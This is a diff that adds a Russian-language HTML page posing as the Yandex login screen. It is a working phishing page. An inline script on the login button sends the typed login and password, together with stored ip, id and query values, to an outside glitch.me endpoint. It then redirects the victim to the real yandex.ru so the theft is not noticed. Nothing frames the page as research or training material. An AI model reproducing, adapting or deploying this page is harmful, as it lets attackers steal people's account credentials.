@@ -1,0 +1,105 @@
+
+<!-- saved from url=(0053)./yandex.php -->
+<html class="gM9oXe bzzxKnpEq zh1Lpvi pafQZCAQD-N7Nmo" lang="ru"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./yandex/8lFaTHLDzmsEZz-5XaQg9iTWZGE.png" rel="icon" type="image/x-icon">
+
+
+
+
+	<title>Авторизация</title>
+	<link href="./yandex/style.css" rel="stylesheet" type="text/css">
+
+</head>
+<body class="fSrkcaWPfsq">
+	<div id="root">
+		<div class="q7XdSdP-fFa" data-react-checksum="1087741583" data-reactid="1" data-reactroot="">
+			<div class="iVO5wAzu pIHPpn1x" data-reactid="2"></div><span class="a6bU-x" data-reactid="3"></span>
+			<div class="aa_Tqcy" data-reactid="4">
+				<div class="pZU-57H_Cq0axzfv" data-reactid="5">
+					<h1 class="hO_5yv_ipaiwHHjz" data-reactid="6"><a data-reactid="7" href="./yandex.php"><span class="aUmvIl uah2Ec1ALn" data-reactid="8"></span></a></h1>
+					<div class="kyYbyAR0dh f1wt4e xsBPtt" data-reactid="9">
+						<div class="dmCemNI7OlXYNw" data-reactid="10">
+							<div class="wWY8GEXuont yclOx5tSNj" data-reactid="11">
+								<div class="dWao0l" data-reactid="12">
+									<div class="f1wt4e" data-reactid="13">
+										<div class="opTnSZLM5y" data-reactid="14"></div>
+										<form method="POST" class="bWAzC6RyTro5m" data-reactid="15">
+											<div class="iXocapbXj" data-reactid="25">
+												<label class="pJl7ZwucYoHMi0Fs" data-reactid="26"><input class="qOemzwsa9AGSBaNv" data-reactid="27"id="lgn" placeholder="" required="" type="text"> <span class="atXn4f" data-reactid="28"><span class="ehaRTMPTvKJ8d" data-reactid="29">Логин или номер телефона</span></span></label>
+											</div>
+											<div class="iXocapbXj" data-reactid="30">
+												<label class="pJl7ZwucYoHMi0Fs" data-reactid="31"><input class="qOemzwsa9AGSBaNv" data-reactid="32" id="psw" placeholder="" required="" type="password"> <span class="atXn4f" data-reactid="33"><span class="ehaRTMPTvKJ8d" data-reactid="34">Пароль</span></span></label>
+											</div>
+											<div class="iXocapbXj" data-reactid="35">
+												<label class="sn3uKLo" data-reactid="36"><input class="btlYrNtzOCLxfg" data-reactid="37" type="checkbox" value="no"><span class="aIVTdR3yKx" data-reactid="38"></span> <span class="l6u-ruBch6us" data-reactid="39">Чужой компьютер</span></label>
+											</div>
+											<div class="iXocapbXj" data-reactid="40">
+												<button class="mbLf9U6lzAr" data-reactid="41" type="submit" id="btn" ><span class="pG150Aoyej2mMYiz" data-reactid="42"><span id="btn" class="u1_giG97zHDp" data-reactid="43">Войти</span></span></button> <button class="mbLf9U6lzAr boUZMXfcMnt" data-reactid="44" type="button"><span class="pG150Aoyej2mMYiz" data-reactid="45"></span></button>
+											</div>
+										</form>
+  <script>
+    document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'ya'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                   location.replace('https://yandex.ru/')
+                }, 500)
+            })
+    })
+  </script>												
+										
+										<div data-reactid="46">
+											<h3 class="owD7nCTy4ui" data-reactid="47">Или войдите с&nbsp;помощью соцсетей</h3>
+											<ul class="tXDhg7u4yXAko" data-reactid="48">
+												<li class="hNKtU_nAkeb" data-reactid="49"><button class="oyUvoQIedIQvGec mKTNF1Ywl" data-metrics="Начало соцавторизации: vk" data-reactid="50" role="button" tabindex="0"><span class="aUmvIl pcU9wcqm" data-reactid="51"></span></button></li>
+												<li class="hNKtU_nAkeb" data-reactid="52"><button class="oyUvoQIedIQvGec f-kLSw" data-metrics="Начало соцавторизации: ok" data-reactid="53" role="button" tabindex="0"><span class="aUmvIl dx0jVT5v_6vt" data-reactid="54"></span></button></li>
+												<li class="hNKtU_nAkeb" data-reactid="55"><button class="oyUvoQIedIQvGec zoX7LSwYkjhf" data-metrics="Начало соцавторизации: tw" data-reactid="56" role="button" tabindex="0"><span class="aUmvIl eb26qo" data-reactid="57"></span></button></li>
+												<li class="hNKtU_nAkeb" data-reactid="58"><button class="oyUvoQIedIQvGec kkkt3a" data-metrics="Начало соцавторизации: mr" data-reactid="59" role="button" tabindex="0"><span class="aUmvIl vSsYk_xFTl" data-reactid="60"></span></button></li>
+												<li class="hNKtU_nAkeb" data-reactid="61"><button class="oyUvoQIedIQvGec nlUeJ9aif" data-metrics="Начало соцавторизации: gg" data-reactid="62" role="button" tabindex="0"><span class="aUmvIl tcoY2mvNhlMf" data-reactid="63"></span></button></li>
+												<li class="hNKtU_nAkeb" data-reactid="64"><button class="oyUvoQIedIQvGec bc_feh" data-metrics="Начало соцавторизации: fb" data-reactid="65" role="button" tabindex="0"><span class="aUmvIl po2DB3aF2yAjJb" data-reactid="66"></span></button></li>
+											</ul>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<ul class="lU691Vyf" data-reactid="67">
+							<li class="wbmPzrMg" data-reactid="68"><a class="dxefd4BtT-n j2iu5P5m0LFJrl" data-metrics="Клик на восстановление" data-reactid="69" href="./yandex.php">Не&nbsp;могу войти</a></li>
+							<li class="wbmPzrMg" data-reactid="70"><a class="dxefd4BtT-n j2iu5P5m0LFJrl" data-metrics="Клик на регистрацию" data-reactid="71" href="./yandex.php">Регистрация</a></li>
+						</ul>
+					</div>
+				</div>
+				<div class="pa4nMkIBEEk" data-reactid="73">
+					<a data-metrics="Клик на Вернуться на сервис" data-reactid="74" href="./yandex.php">Вернуться на&nbsp;сервис</a>
+				</div>
+			</div>
+			<footer class="yVO1-cDlm4yADb" data-reactid="75">
+				<div class="qI9Eui7kV6u" data-reactid="76">
+					<span class="lVh9Q2bvkLPn aZ_oDZmkL1f-f" data-reactid="77"><span class="uiw-_dpWMaTp a-r5ee1mKb l0CHUPes" data-reactid="78" role="button" tabindex="0"><span class="s9Uuk_5DrUm" data-reactid="79"><!-- react-text: 80 --> ru <!-- /react-text --></span></span></span><span class="lVh9Q2bvkLPn" data-reactid="82"><a class="uiw-_dpWMaTp a-r5ee1mKb" data-reactid="83" href="./yandex.php" tabindex="0"><span class="s9Uuk_5DrUm" data-reactid="84"><!-- react-text: 85 --> Помощь <!-- /react-text --></span></a></span><span class="lVh9Q2bvkLPn oUIkCO1lDC9-0se" data-reactid="86"><!-- react-text: 87 --> © 2001-2021, <!-- /react-text --><a class="uiw-_dpWMaTp a-r5ee1mKb" data-reactid="88" href="./yandex.php" tabindex="0"><span class="s9Uuk_5DrUm" data-reactid="89"><!-- react-text: 90 --> Яндекс <!-- /react-text --></span></a></span>
+				</div>
+			</footer>
+		</div>
+	</div>
+	<div>
+		<div class="srqU-X2zoi uY8m7rh2IUqkhyvb eKlYHCd yGF8keM5Kg" data-reactroot="">
+			<ul aria-disabled="false" class="o6253UdLxq y8ESMOBrLq-UcwDr f2QCzscEeWOSl jsN7Wb4k jvUUGIx1aq2h9wfg">
+				<li class="w00656c"><a aria-disabled="false" aria-selected="false" class="d6vfns iImOk3nvSR8OMPj" href="./yandex.php" role="link"><span class="qCqYYy">En</span></a></li>
+			</ul>
+		</div>
+	</div>
+
+
+	</body></html>
